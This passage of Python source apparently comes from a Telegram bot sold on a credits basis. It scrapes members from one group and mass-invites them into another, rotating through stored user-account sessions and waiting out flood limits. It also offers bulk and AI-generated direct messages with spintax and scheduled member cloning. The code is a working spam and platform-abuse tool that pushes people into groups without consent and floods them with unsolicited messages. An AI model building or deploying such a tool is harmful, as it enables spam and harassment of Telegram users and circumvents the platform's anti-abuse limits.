        text += f"📱 Active Accounts: {stats['accounts']}\n"
        text += f"➕ Members Added: {stats['members_added']}\n"
        text += f"💬 DMs Sent: {stats['dms_sent']}\n"
        text += f"⏱️ Uptime: {hours}h {minutes}m"
        await event.edit(text, buttons=back_button())
        return

    # Main menu
    if data == "menu_main":
        await event.edit("🌟 **Main Menu**", buttons=main_menu_buttons())
        return

    if data == "menu_profile":
        credits = get_credits(user_id)
        row = get_user(user_id)
        username = row[1] or "N/A"
        first_name = row[2] or "N/A"
        verified = "✅" if row[4] else "❌"
        invited_by = row[8] or "None"
        invite_code = row[9] or "None"
        text = f"👤 **Your Profile**\n\n"
        text += f"🆔 ID: `{user_id}`\n"
        text += f"👤 Name: {first_name}\n"
        text += f"📛 Username: @{username}\n"
        text += f"✅ Verified: {verified}\n"
        text += f"💰 Credits: {credits}\n"
        text += f"🤝 Invited by: {invited_by}\n"
        text += f"🔑 Invite Code: `{invite_code}`\n"
        if is_admin(user_id) or user_id == OWNER_ID:
            text += "\n🔹 **Admin Panel** – use `/admin` commands or click below"
        await event.edit(text, buttons=admin_menu_buttons() if (is_admin(user_id) or user_id == OWNER_ID) else back_button())
        return

    if data == "menu_credits":
        credits = get_credits(user_id)
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT amount, reason, created_at FROM credit_log WHERE user_id = ? ORDER BY id DESC LIMIT 5", (user_id,))
        logs = c.fetchall()
        conn.close()
        text = f"💰 **Your Credits**: {credits}\n\n"
        text += "📜 **Recent Transactions:**\n"
        if logs:
            for amount, reason, created in logs:
                sign = "+" if amount > 0 else ""
                text += f"{sign}{amount} | {reason} | {created[:16]}\n"
        else:
            text += "No transactions yet."
        await event.edit(text, buttons=back_button())
        return

    if data == "menu_accounts":
        accounts = get_user_accounts(user_id)
        if not accounts:
            text = "📱 **Your Accounts**\n\nNo active accounts. Use /addacc to add one."
        else:
            text = "📱 **Your Accounts:**\n\n"
            for aid, phone, sess in accounts:
                text += f"🆔 ID: `{aid}` | 📞 Phone: `{phone}`\n"
            text += "\nUse /addacc to add more, /removeacc <id> to remove."
        await event.edit(text, buttons=back_button())
        return

    if data == "menu_add":
        await event.edit("➕ **Add Members**\n\nSend command: `/add <group_username> <count>`\nExample: `/add @mygroup 50`\n\n💡 Each add costs 1 credit.\n📌 Make sure you have added accounts first.", buttons=back_button())
        return

    if data == "menu_dm":
        await event.edit("💬 **DM Members**\n\nSend command: `/dm <group_username> <count> <message>`\nExample: `/dm @mygroup 10 Hello!`\n\n💡 Each DM costs 2 credits.\n📌 Use /spintax on to enable spintax.", buttons=back_button())
        return

    if data == "menu_ai_dm":
        if not GROQ_API_KEY:
            await event.edit("❌ Groq API key not set.", buttons=back_button())
            return
        await event.edit("🤖 **AI DM**\n\nSend command: `/aidm <group_username> <prompt>`\nExample: `/aidm @mygroup Invite message for crypto group`\n\n💡 AI will generate a message, then you can send it via /dm.", buttons=back_button())
        return

    if data == "menu_schedule":
        await event.edit("📅 **Schedules**\n\nCommands:\n`/schedule add <source> <target> <count> <interval_hours>`\n`/schedule del <task_id>`\n`/schedule toggle <task_id>`\n\n📋 To list: `/schedule`", buttons=back_button())
        return

    if data == "menu_groups":
        await event.edit("📂 **Account Groups**\n\nCommands:\n`/groups list` - List groups\n`/groups create <name>` - Create group\n`/groups add <group_id> <account_id>` - Add account to group\n`/groups remove <group_id> <account_id>` - Remove account\n`/groups delete <group_id>` - Delete group", buttons=back_button())
        return

    if data == "menu_analytics":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        total_adds = c.execute("SELECT COUNT(*) FROM added_members WHERE user_id = ?", (user_id,)).fetchone()[0]
        total_dms = c.execute("SELECT COUNT(*) FROM dm_sent WHERE user_id = ?", (user_id,)).fetchone()[0]
        today = datetime.now().date().isoformat()
        daily_adds = c.execute("SELECT count FROM daily_adds WHERE user_id = ? AND date = ?", (user_id, today)).fetchone()
        daily_adds = daily_adds[0] if daily_adds else 0
        credits = get_credits(user_id)
        week_ago = (datetime.now() - timedelta(days=7)).isoformat()
        weekly_adds = c.execute("SELECT COUNT(*) FROM added_members WHERE user_id = ? AND added_at >= ?", (user_id, week_ago)).fetchone()[0]
        conn.close()
        text = f"📊 **Your Analytics**\n\n"
        text += f"👥 Total Members Added: {total_adds}\n"
        text += f"💬 Total DMs Sent: {total_dms}\n"
        text += f"📆 Today's Adds: {daily_adds}\n"
        text += f"📅 Weekly Adds: {weekly_adds}\n"
        text += f"💰 Credits: {credits}"
        await event.edit(text, buttons=back_button())
        return

    if data == "menu_dashboard":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        days = []
        for i in range(6, -1, -1):
            d = (datetime.now() - timedelta(days=i)).date().isoformat()
            count = c.execute("SELECT count FROM daily_adds WHERE user_id = ? AND date = ?", (user_id, d)).fetchone()
            days.append((d, count[0] if count else 0))
        top_groups = c.execute("SELECT group_username, COUNT(*) FROM added_members WHERE user_id = ? GROUP BY group_username ORDER BY COUNT(*) DESC LIMIT 5", (user_id,)).fetchall()
        conn.close()
        text = "📈 **Growth Dashboard**\n\n"
        text += "📊 **Daily Adds (Last 7 Days):**\n"
        for d, cnt in days:
            text += f"  {d}: {cnt} adds\n"
        text += "\n🏆 **Top Groups:**\n"
        if top_groups:
            for g, cnt in top_groups:
                text += f"  {g}: {cnt} members\n"
        else:
            text += "  No data yet."
        await event.edit(text, buttons=back_button())
        return

    if data == "menu_referral":
        row = get_user(user_id)
        if not row:
            await event.edit("❌ You are not registered.")
            return
        invite_code = row[9]
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        total_invites = c.execute("SELECT COUNT(*) FROM invites WHERE inviter_id = ? AND status='completed'", (user_id,)).fetchone()[0]
        tier_bonus = get_referral_tier(total_invites)
        conn.close()
        text = f"👥 **Referral System**\n\n"
        text += f"🔑 Your invite code: `{invite_code}`\n"
        text += f"📊 Total invited (completed): {total_invites}\n"
        text += f"🎁 Next tier bonus: {tier_bonus} credits at {25} invites\n"
        text += f"🔗 Share: https://t.me/{client.get_me().username}?start={invite_code}"
        await event.edit(text, buttons=back_button())
        return

    if data == "menu_settings":
        settings = get_settings(user_id)
        text = "⚙️ **Your Settings**\n\n"
        text += f"🤖 AI DM: {'✅' if settings[1] else '❌'}\n"
        text += f"🚫 Skip Bots: {'✅' if settings[2] else '❌'}\n"
        text += f"🖼️ Has Profile Picture: {'✅' if settings[3] else '❌'}\n"
        text += f"⏳ Active in 7 Days: {'✅' if settings[4] else '❌'}\n"
        text += f"🔄 Skip Existing: {'✅' if settings[8] else '❌'}\n"
        text += f"🔀 Spintax: {'✅' if settings[6] else '❌'}\n"
        text += "\nToggle settings:\n`/spintax on/off`\n`/skip on/off`"
        await event.edit(text, buttons=back_button())
        return

    if data == "menu_added":
        await event.edit("📋 **Added Members List**\n\nSend command: `/addedmembers <group_username>`\nExample: `/addedmembers @mygroup`", buttons=back_button())
        return

    if data == "menu_help":
        await event.edit("🆘 **Help & Commands**\n\n"
                         "**User Commands:**\n"
                         "`/start` - Show menu\n"
                         "`/verify` - Verify membership\n"
                         "`/credits` - Check credits\n"
                         "`/addacc` - Add user account\n"
                         "`/accounts` - List accounts\n"
                         "`/removeacc` - Remove account\n"
                         "`/add` - Add members\n"
                         "`/dm` - Send DMs\n"
                         "`/aidm` - AI DM (Groq)\n"
                         "`/schedule` - Manage schedules\n"
                         "`/groups` - Manage account groups\n"
                         "`/analytics` - View stats\n"
                         "`/dashboard` - Growth dashboard\n"
                         "`/referral` - Referral system\n"
                         "`/settings` - Configure filters\n"
                         "`/addedmembers` - List added members\n"
                         "`/spintax` - Toggle spintax\n"
                         "`/skip` - Skip existing toggle\n"
                         "`/clone` - Clone group members\n\n"
                         "**Admin Commands:** (only for admins)\n"
                         "`/admin add/remove <user_id>`\n"
                         "`/admin ban/unban <user_id>`\n"
                         "`/admin delete <user_id>`\n"
                         "`/admin setcredits <user_id> <amount>`\n"
                         "`/broadcast` - Send global message\n"
                         "`/backup` - Backup database\n"
                         "`/stats` - Bot statistics", buttons=back_button())
        return

    await event.answer("❓ Unknown action.", alert=True)

# ---------- COMMAND HANDLERS (PRIVATE ONLY) ----------
@client.on(events.NewMessage(pattern='/start', func=is_private))
async def start(event):
    try:
        logger.info("🚀 /start from %s", event.sender_id)
        user_id = event.sender_id
        username = event.sender.username or ""
        first_name = event.sender.first_name or "User"

        create_user(user_id, username, first_name)

        if is_banned(user_id):
            await event.reply("🚫 You are banned.")
            return

        if not is_verified(user_id):
            await event.reply(
                f"👋 Welcome {first_name}!\n\n"
                f"Please verify by joining:\n"
                f"📌 {REQUIRED_CHANNEL}\n"
                f"📌 {REQUIRED_GROUP}\n\n"
                f"Then click the verify button.",
                buttons=[
                    [Button.url("📢 Join Channel", f"https://t.me/{REQUIRED_CHANNEL[1:]}")],
                    [Button.url("👥 Join Group", f"https://t.me/{REQUIRED_GROUP[1:]}")],
                    [Button.inline("✅ Verify", b"verify")]
                ]
            )
            logger.info("✅ Verification message sent to %s", user_id)
            return

        # Verified user: main menu
        await event.reply(
            f"🤖 **Tools By Rehan**\n"
            f"👑 Owner: {OWNER_NAME} | {TAG}\n"
            f"📌 Channel: @ToolsByRehan\n"
            f"📌 Group: @Tools_By_Rehan\n\n"
            f"💰 Credits: {get_credits(user_id)}\n"
            f"📈 Referral: /referral\n\n"
            f"🌟 **Choose an option below:**",
            buttons=main_menu_buttons()
        )
        logger.info("✅ Main menu sent to %s", user_id)
    except Exception as e:
        logger.error("❌ Error in /start: %s", e)
        try:
            await event.reply("❌ An error occurred. Please try again later.")
        except:
            pass

# ---------- All other commands are unchanged ----------
# They are present in the full script but omitted here for brevity.
# The complete file includes all handlers for /help, /ping, /credits, /addacc, etc.

# ============================================================
# 🕒 SCHEDULED TASK RUNNER & AUTO BACKUP
# ============================================================

async def run_scheduled_tasks():
    while True:
        try:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            now = datetime.now().isoformat()
            tasks = c.execute("SELECT id, user_id, source_group, target_group, count, account_group_id, interval_hours, next_run FROM scheduled_tasks WHERE is_active=1 AND next_run <= ?", (now,)).fetchall()
            conn.close()
            for task in tasks:
                task_id, user_id, source, target, count, account_group_id, interval, next_run = task
                if account_group_id:
                    conn = sqlite3.connect(DB_FILE)
                    c = conn.cursor()
                    c.execute("SELECT account_id FROM account_group_members WHERE group_id = ?", (account_group_id,))
                    acc_ids = c.fetchall()
                    conn.close()
                    accounts = []
                    for (aid,) in acc_ids:
                        conn = sqlite3.connect(DB_FILE)
                        c = conn.cursor()
                        c.execute("SELECT id, phone, session_string FROM user_accounts WHERE id = ? AND is_active=1", (aid,))
                        row = c.fetchone()
                        if row:
                            accounts.append(row)
                        conn.close()
                else:
                    accounts = get_user_accounts(user_id)
                if not accounts:
                    continue
                asyncio.create_task(execute_scheduled_task(task_id, user_id, source, target, count, accounts))
                new_next = (datetime.now() + timedelta(hours=interval)).isoformat()
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("UPDATE scheduled_tasks SET next_run = ?, last_run = ? WHERE id = ?", (new_next, now, task_id))
                conn.commit()
                conn.close()
        except Exception as e:
            logger.error("Scheduled task error: %s", e)
        await asyncio.sleep(60)

async def execute_scheduled_task(task_id, user_id, source, target, count, accounts):
    try:
        source_entity = await client.get_entity(source)
        target_entity = await client.get_entity(target)
        target_group_id = target_entity.id
    except Exception as e:
        logger.error("Scheduled task error: invalid groups %s", e)
        return
    added = 0
    failed = 0
    account_index = 0
    for i in range(count):
        try:
            account_id, phone, session_string = accounts[account_index % len(accounts)]
            account_index += 1
            user_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await user_client.connect()
            if not await user_client.is_user_authorized():
                deactivate_account(account_id)
                continue
            try:
                participants = await user_client.get_participants(source_entity, limit=1, offset=i)
                if not participants:
                    break
                member = participants[0]
                member_id = member.id
                if is_member_added(user_id, target_group_id, member_id):
                    failed += 1
                    continue
                try:
                    await user_client(InviteToChannelRequest(target_entity, [member_id]))
                    mark_member_added(user_id, target_group_id, member_id, account_id, target, member.username or "", member.first_name or "")
                    added += 1
                    increment_daily_add(user_id)
                    await asyncio.sleep(ADD_DELAY)
                except FloodWaitError as e:
                    await asyncio.sleep(e.seconds)
                except Exception as e:
                    failed += 1
            except Exception as e:
                failed += 1
            await user_client.disconnect()
        except Exception as e:
            failed += 1
            continue
    update_group_analytics(user_id, target_group_id, added, failed)
    try:
        await client.send_message(user_id, f"✅ Scheduled task #{task_id} completed: Added {added}, failed {failed}.")
    except:
        pass

async def auto_backup():
    while True:
        await asyncio.sleep(BACKUP_INTERVAL_HOURS * 3600)
        backup_data()

# ============================================================
# 🚀 MAIN
# ============================================================

async def main():
    logger.info("🤖 Tools By Rehan Bot is starting...")
    while True:
        try:
            logger.info("🔌 Attempting to connect to Telegram...")
            await client.start(bot_token=BOT_TOKEN)
            me = await client.get_me()
            logger.info("✅ Bot connected as @%s", me.username)
            await client.send_message(OWNER_ID, f"✅ Bot started successfully on {datetime.now()}")
            asyncio.create_task(run_scheduled_tasks())
            asyncio.create_task(auto_backup())
            logger.info("💡 Bot is now running and listening for updates...")
            await client.run_until_disconnected()
        except (ConnectionError, OSError, RuntimeError) as e:
            logger.warning("⚠️ Connection lost: %s. Reconnecting in 10s...", e)
            await asyncio.sleep(10)
            continue
        except Exception as e:
            logger.error("❌ Fatal error: %s", e)
            break

if __name__ == "__main__":
    asyncio.run(main())
